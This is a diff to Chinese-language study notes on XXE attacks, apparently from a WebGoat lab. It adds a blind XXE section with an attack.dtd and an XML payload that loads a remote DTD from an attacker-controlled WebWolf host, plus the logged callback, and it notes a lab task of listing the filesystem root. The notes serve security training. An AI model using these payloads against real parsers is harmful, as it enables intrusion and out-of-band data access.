@@ -1,4 +1,4 @@
-# XEE
+# XXE
 
 ### 概念
 
@@ -93,9 +93,63 @@ XML外部实体攻击是针对解析XML输入的应用程序的一种攻击。�
 
 这被称为“十亿笑”，更多信息可以在这里找到:https://en.wikipedia.org/wiki/billion_laughing
 
+
+
+### Blind XXE
+
+在某些情况下，您将看不到任何输出，因为尽管您的攻击可能已经奏效，但该字段并未反映在页面的输出中。 或者您尝试读取的资源包含非法XML字符，这会导致解析器失败。 让我们从一个示例开始，在这种情况下，我们引用一个由我们自己的服务器控制的外部DTD。 
+
+作为攻击者，您可以控制WebWolf（可以是您控制下的任何服务器。），例如，您可以使用该服务器通过http://192.168.56.101:9090/landing对其进行ping操作
+
+我们如何使用此端点来验证我们是否可以执行XXE？ 
+
+我们可以再次使用WebWolf托管一个名为Attack.dtd的文件，并使用以下内容创建该文件
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY ping SYSTEM 'http://192.168.56.101:9090/landing'>
+```
+
+ 现在提交表单，将xml更改为： 
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://192.168.56.101:9090/WebWolf/files/attack.dtd">
+%remote;
+]>
+<comment>
+  <text>test&ping;</text>
+</comment>
+```
+
+ 现在在WebWolf浏览到“传入请求”，你会看到 
+
+```
+{
+  "method" : "GET",
+  "path" : "/landing",
+  "headers" : {
+    "request" : {
+      "user-agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
+    },
+  },
+  "parameters" : {
+    "test" : [ "HelloWorld" ],
+  },
+  "timeTaken" : "1"
+}
+```
+
+ 所以有了XXE，我们可以ping我们自己的服务器，这意味着XXE注入是可能的。所以使用XXE注入我们基本上可以达到和开始使用curl命令时一样的效果。 
+
+
+
 # 解题
 
 * lesson3
+
+  
 
  在提交表单时，您将在照片中添加一条注释，并尝试执行带有注释字段的XXE注入。试着列出文件系统的根目录。 
 
@@ -108,3 +162,5 @@ XML外部实体攻击是针对解析XML输入的应用程序的一种攻击。�
   ![](img/XEE3.png)
 
   ![](img/XEE2.png)
+  
+  
